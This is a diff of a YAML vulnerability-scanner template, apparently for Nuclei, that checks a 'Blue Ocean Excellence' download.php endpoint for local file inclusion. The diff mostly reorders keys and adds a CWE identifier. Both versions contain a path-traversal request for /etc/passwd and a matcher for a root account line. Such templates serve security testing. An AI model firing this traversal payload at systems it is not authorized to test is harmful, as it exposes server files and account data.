@@ -1,5 +1,4 @@
 id: blue-ocean-excellence-lfi
-
 info:
   name: Blue Ocean Excellence - Local File Inclusion
   author: pikpikcu
@@ -10,23 +9,19 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
     cvss-score: 7.5
-    cwe-id: CWE-22
+    cwe-id: CWE-22,CWE-23
   metadata:
     max-request: 1
   tags: blue-ocean,lfi,vuln
-
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/download.php?file=../../../../../etc/passwd"
-
-    matchers-condition: and
-    matchers:
-      - type: regex
-        regex:
-          - "toor:[x*]:0:0"
-
-      - type: status
-        status:
+  - matchers:
+      - regex:
+          - toor:[x*]:0:0
+        type: regex
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/download.php?file=../../../../../etc/passwd'
